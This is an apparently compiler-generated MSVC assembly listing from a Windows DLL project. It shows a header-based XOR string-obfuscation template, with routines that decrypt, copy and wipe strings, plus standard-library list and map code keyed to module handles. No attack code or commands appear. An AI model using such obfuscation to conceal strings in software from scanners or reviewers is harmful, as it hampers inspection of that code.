??B?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEAAPEADXZ PROC ; ay::obfuscated_data<25,8178357769676364775,char>::operator char *, COMDAT

; 139  : 		{

$LN4:
	sub	rsp, 40					; 00000028H
	mov	r11, rcx

; 140  : 			decrypt();

	call	?decrypt@?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEAAXXZ ; ay::obfuscated_data<25,8178357769676364775,char>::decrypt

; 141  : 			return m_data;

	mov	rax, r11

; 142  : 		}

	add	rsp, 40					; 00000028H
	ret	0
??B?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEAAPEADXZ ENDP ; ay::obfuscated_data<25,8178357769676364775,char>::operator char *
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??1?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEAA@XZ PROC ; ay::obfuscated_data<25,8178357769676364775,char>::~obfuscated_data<25,8178357769676364775,char>, COMDAT

; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	xorps	xmm0, xmm0
	movups	XMMWORD PTR [rcx], xmm0
	mov	QWORD PTR [rcx+16], rax
	mov	BYTE PTR [rcx+24], al

; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}

	ret	0
??1?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEAA@XZ ENDP ; ay::obfuscated_data<25,8178357769676364775,char>::~obfuscated_data<25,8178357769676364775,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??0?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEAA@AEBV?$obfuscator@$0BJ@$0HBHPFNAPILJNJLOH@D@1@@Z
_TEXT	SEGMENT
this$ = 8
obfuscator$ = 16
??0?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEAA@AEBV?$obfuscator@$0BJ@$0HBHPFNAPILJNJLOH@D@1@@Z PROC ; ay::obfuscated_data<25,8178357769676364775,char>::obfuscated_data<25,8178357769676364775,char>, COMDAT

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	lea	rax, QWORD PTR [rdx+24]
	mov	BYTE PTR [rcx+25], 1
	lea	r8, QWORD PTR [rcx+24]
	cmp	rcx, rax
	ja	SHORT $LN10@obfuscated
	cmp	r8, rdx
	jb	SHORT $LN10@obfuscated

; 119  : 		{
; 120  : 			// Copy obfuscated data
; 121  : 			for ( size_type i = 0; i < N; i++ )
; 122  : 			{
; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	r8, rcx
	sub	rdx, rcx
	mov	r9d, 25
	npad	14
$LL15@obfuscated:
	movzx	eax, BYTE PTR [rdx+r8]
	mov	BYTE PTR [r8], al
	lea	r8, QWORD PTR [r8+1]
	sub	r9, 1
	jne	SHORT $LL15@obfuscated

; 124  : 			}
; 125  : 		}

	mov	rax, rcx
	ret	0
$LN10@obfuscated:

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	movups	xmm0, XMMWORD PTR [rdx]
	movzx	eax, BYTE PTR [rdx+24]
	movsd	xmm1, QWORD PTR [rdx+16]
	movups	XMMWORD PTR [rcx], xmm0
	movsd	QWORD PTR [rcx+16], xmm1
	mov	BYTE PTR [rcx+24], al

; 124  : 			}
; 125  : 		}

	mov	rax, rcx
	ret	0
??0?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEAA@AEBV?$obfuscator@$0BJ@$0HBHPFNAPILJNJLOH@D@1@@Z ENDP ; ay::obfuscated_data<25,8178357769676364775,char>::obfuscated_data<25,8178357769676364775,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??E?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEAAAEAV01@XZ
_TEXT	SEGMENT
this$ = 8
??E?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEAAAEAV01@XZ PROC ; std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::operator++, COMDAT

; 50   :         _Ptr = _Ptr->_Next;

	mov	rax, QWORD PTR [rcx]
	mov	rdx, QWORD PTR [rax]

; 107  :         _Mybase::operator++();
; 108  :         return *this;

	mov	rax, rcx

; 50   :         _Ptr = _Ptr->_Next;

	mov	QWORD PTR [rcx], rdx

; 109  :     }

	ret	0
??E?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEAAAEAV01@XZ ENDP ; std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::operator++
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??D?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEBAAEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@XZ
_TEXT	SEGMENT
this$ = 8
??D?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEBAAEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@XZ PROC ; std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::operator*, COMDAT

; 42   :         return _Ptr->_Myval;

	mov	rax, QWORD PTR [rcx]
	add	rax, 16

; 99   :         return const_cast<reference>(_Mybase::operator*());
; 100  :     }

	ret	0
??D?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEBAAEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@XZ ENDP ; std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::operator*
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??B?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@QEAAPEADXZ
_TEXT	SEGMENT
this$ = 8
??B?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@QEAAPEADXZ PROC ; ay::obfuscated_data<12,-1449805614855655457,char>::operator char *, COMDAT

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rcx+12], 0

; 139  : 		{

	mov	r8, rcx

; 147  : 			if ( m_encrypted )

	je	$LN29@operator

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	eax, eax
	cmp	DWORD PTR __isa_available, 5
	jl	$LN28@operator

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	eax, WORD PTR [rcx]
	movdqa	xmm3, XMMWORD PTR __xmm@ebe1417985296fdfebe1417985296fdf
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000008000000000000000800
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx], ax
	movzx	eax, WORD PTR [rcx+2]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+2], ax
	movzx	eax, WORD PTR [rcx+4]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+4], ax
	movzx	eax, WORD PTR [rcx+6]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx+6], ax
	mov	eax, 8
$LN28@operator:
	mov	r9, -1449805614855655457		; ebe1417985296fdfH
$LL27@operator:
	movzx	ecx, al
	mov	rdx, r9
	and	cl, 7
	shl	cl, 3
	shr	rdx, cl
	xor	BYTE PTR [r8+rax], dl
	inc	rax
	cmp	rax, 12
	jb	SHORT $LL27@operator

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+12], 0
$LN29@operator:

; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}

	mov	rax, r8
	ret	0
??B?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@QEAAPEADXZ ENDP ; ay::obfuscated_data<12,-1449805614855655457,char>::operator char *
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??1?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@QEAA@XZ PROC ; ay::obfuscated_data<12,-1449805614855655457,char>::~obfuscated_data<12,-1449805614855655457,char>, COMDAT

; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	mov	QWORD PTR [rcx], rax
	mov	DWORD PTR [rcx+8], eax

; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}

	ret	0
??1?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@QEAA@XZ ENDP ; ay::obfuscated_data<12,-1449805614855655457,char>::~obfuscated_data<12,-1449805614855655457,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??0?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@QEAA@AEBV?$obfuscator@$0M@$0?BEBOLOIGHKNGJACB@D@1@@Z
_TEXT	SEGMENT
this$ = 8
obfuscator$ = 16
??0?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@QEAA@AEBV?$obfuscator@$0M@$0?BEBOLOIGHKNGJACB@D@1@@Z PROC ; ay::obfuscated_data<12,-1449805614855655457,char>::obfuscated_data<12,-1449805614855655457,char>, COMDAT

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rcx+12], 1
	movzx	eax, BYTE PTR [rdx]
	mov	BYTE PTR [rcx], al
	movzx	eax, BYTE PTR [rdx+1]
	mov	BYTE PTR [rcx+1], al
	movzx	eax, BYTE PTR [rdx+2]
	mov	BYTE PTR [rcx+2], al
	movzx	eax, BYTE PTR [rdx+3]
	mov	BYTE PTR [rcx+3], al
	movzx	eax, BYTE PTR [rdx+4]
	mov	BYTE PTR [rcx+4], al
	movzx	eax, BYTE PTR [rdx+5]
	mov	BYTE PTR [rcx+5], al
	movzx	eax, BYTE PTR [rdx+6]
	mov	BYTE PTR [rcx+6], al
	movzx	eax, BYTE PTR [rdx+7]
	mov	BYTE PTR [rcx+7], al
	movzx	eax, BYTE PTR [rdx+8]
	mov	BYTE PTR [rcx+8], al
	movzx	eax, BYTE PTR [rdx+9]
	mov	BYTE PTR [rcx+9], al
	movzx	eax, BYTE PTR [rdx+10]
	mov	BYTE PTR [rcx+10], al
	movzx	eax, BYTE PTR [rdx+11]
	mov	BYTE PTR [rcx+11], al
	mov	rax, rcx
	ret	0
??0?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@QEAA@AEBV?$obfuscator@$0M@$0?BEBOLOIGHKNGJACB@D@1@@Z ENDP ; ay::obfuscated_data<12,-1449805614855655457,char>::obfuscated_data<12,-1449805614855655457,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??C?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEBAPEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@XZ
_TEXT	SEGMENT
this$ = 8
??C?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEBAPEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@XZ PROC ; std::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::operator->, COMDAT

; 150  :         return this->_Ptr->_Myval;

	mov	rax, QWORD PTR [rcx]
	add	rax, 16

; 242  :         return pointer_traits<pointer>::pointer_to(**this);
; 243  :     }

	ret	0
??C?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEBAPEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@XZ ENDP ; std::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::operator->
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??8?$_List_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEBA_NAEBV01@@Z
_TEXT	SEGMENT
this$ = 8
_Right$ = 16
??8?$_List_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEBA_NAEBV01@@Z PROC ; std::_List_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::operator==, COMDAT

; 193  : #if _ITERATOR_DEBUG_LEVEL == 2
; 194  :         _STL_VERIFY(this->_Getcont() == _Right._Getcont(), "list iterators incompatible");
; 195  : #endif // _ITERATOR_DEBUG_LEVEL == 2
; 196  : 
; 197  :         return this->_Ptr == _Right._Ptr;

	mov	rax, QWORD PTR [rdx]
	cmp	QWORD PTR [rcx], rax
	sete	al

; 198  :     }

	ret	0
??8?$_List_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEBA_NAEBV01@@Z ENDP ; std::_List_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::operator==
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??8?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEBA_NAEBV01@@Z
_TEXT	SEGMENT
this$ = 8
_Right$ = 16
??8?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEBA_NAEBV01@@Z PROC ; std::_List_unchecked_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,std::_Iterator_base0>::operator==, COMDAT

; 72   :         return _Ptr == _Right._Ptr;

	mov	rax, QWORD PTR [rdx]
	cmp	QWORD PTR [rcx], rax
	sete	al

; 73   :     }

	ret	0
??8?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEBA_NAEBV01@@Z ENDP ; std::_List_unchecked_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,std::_Iterator_base0>::operator==
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\unordered_map
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\unordered_map
;	COMDAT ?at@?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAAAEAPEAUHINSTANCE__@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z
_TEXT	SEGMENT
_Target$ = 32
this$dead$ = 64
_Keyval$ = 72
?at@?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAAAEAPEAUHINSTANCE__@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z PROC ; std::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::at, COMDAT

; 436  :     _NODISCARD mapped_type& at(const key_type& _Keyval) {

$LN41:
	sub	rsp, 56					; 00000038H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rdx+24], 15

; 2235 :         const value_type* _Result = _Bx._Buf;

	mov	r8, rdx

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	mov	r10, QWORD PTR [rdx+16]

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN17@at

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	r8, QWORD PTR [rdx]
$LN17@at:

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	xor	ecx, ecx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2333 :     return _Fnv1a_append_bytes(

	mov	r9, -3750763034362895579		; cbf29ce484222325H

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	test	r10, r10
	je	SHORT $LN28@at
	mov	r11, 1099511628211			; 00000100000001b3H
$LL34@at:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	eax, BYTE PTR [r8+rcx]
	inc	rcx
	xor	r9, rax

; 2302 :         _Val *= _FNV_prime;

	imul	r9, r11
	cmp	rcx, r10
	jb	SHORT $LL34@at
$LN28@at:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\unordered_map

; 437  :         const auto _Target = this->_Find_last(_Keyval, this->_Traitsobj(_Keyval));

	mov	r8, rdx
	lea	rdx, QWORD PTR _Target$[rsp]
	call	??$_Find_last@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA?AU?$_Hash_find_last_result@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Find_last<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >

; 438  :         if (_Target._Duplicate) {

	mov	rax, QWORD PTR _Target$[rsp+8]
	test	rax, rax
	je	SHORT $LN2@at

; 439  :             return _Target._Duplicate->_Myval.second;

	add	rax, 48					; 00000030H

; 443  :     }

	add	rsp, 56					; 00000038H
	ret	0
$LN2@at:

; 440  :         }
; 441  : 
; 442  :         _Xout_of_range("invalid unordered_map<K, T> key");

	lea	rcx, OFFSET FLAT:??_C@_0CA@MMOGIFNF@invalid?5unordered_map?$DMK?0?5T?$DO?5key@
	call	?_Xout_of_range@std@@YAXPEBD@Z		; std::_Xout_of_range
	int	3
$LN38@at:
